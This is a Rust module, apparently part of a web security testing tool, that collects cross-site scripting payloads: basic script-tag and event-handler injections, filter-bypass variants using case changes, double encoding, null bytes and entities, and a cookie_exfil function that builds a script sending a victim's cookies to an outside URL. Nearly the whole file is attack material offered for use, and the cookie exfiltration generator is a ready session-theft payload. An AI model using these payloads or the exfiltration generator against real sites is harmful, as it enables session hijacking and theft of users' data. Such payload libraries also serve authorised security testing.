//! XSS (Cross-Site Scripting) payloads

/// XSS payload with metadata
#[derive(Debug, Clone)]
pub struct XssPayload {
    pub name: String,
    pub payload: String,
    pub category: XssCategory,
}

#[derive(Debug, Clone, PartialEq)]
pub enum XssCategory {
    Reflected,
    Stored,
    Dom,
    FilterBypass,
}

impl XssPayload {
    pub fn new(name: &str, payload: &str, category: XssCategory) -> Self {
        Self {
            name: name.to_string(),
            payload: payload.to_string(),
            category,
        }
    }
}

/// Basic XSS payloads
pub fn basic_payloads() -> Vec<XssPayload> {
    vec![
        XssPayload::new(
            "Script tag",
            "<script>alert('XSS')</script>",
            XssCategory::Reflected,
        ),
        XssPayload::new(
            "Img onerror",
            "<img src=x onerror=alert('XSS')>",
            XssCategory::Reflected,
        ),
        XssPayload::new(
            "Iframe",
            r#"<iframe src="javascript:alert('XSS')">"#,
            XssCategory::Reflected,
        ),
        XssPayload::new(
            "SVG onload",
            "<svg onload=alert('XSS')>",
            XssCategory::Reflected,
        ),
        XssPayload::new(
            "Body onload",
            "<body onload=alert('XSS')>",
            XssCategory::Reflected,
        ),
        XssPayload::new(
            "Input onfocus",
            "<input onfocus=alert('XSS') autofocus>",
            XssCategory::Reflected,
        ),
        XssPayload::new(
            "A href javascript",
            r#"<a href="javascript:alert('XSS')">click</a>"#,
            XssCategory::Reflected,
        ),
    ]
}

/// Filter bypass payloads
pub fn filter_bypass_payloads() -> Vec<XssPayload> {
    vec![
        XssPayload::new(
            "Case variation",
            "<ScRiPt>alert('XSS')</sCrIpT>",
            XssCategory::FilterBypass,
        ),
        XssPayload::new(
            "Double encoding",
            "%253Cscript%253Ealert('XSS')%253C/script%253E",
            XssCategory::FilterBypass,
        ),
        XssPayload::new(
            "Null byte",
            "<scr\x00ipt>alert('XSS')</script>",
            XssCategory::FilterBypass,
        ),
        XssPayload::new(
            "HTML entities",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            XssCategory::FilterBypass,
        ),
        XssPayload::new(
            "Unicode",
            "\u{003c}script\u{003e}alert('XSS')\u{003c}/script\u{003e}",
            XssCategory::FilterBypass,
        ),
    ]
}

/// Generate XSS payload with custom script
pub fn custom_script(script: &str) -> String {
    format!("<script>{}</script>", script)
}

/// Generate cookie exfiltration payload
pub fn cookie_exfil(exfil_url: &str) -> String {
    format!(
        r#"<script>new Image().src='{}?c='+document.cookie</script>"#,
        exfil_url
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_basic_payloads() {
        let payloads = basic_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.payload.contains("alert")));
    }
}
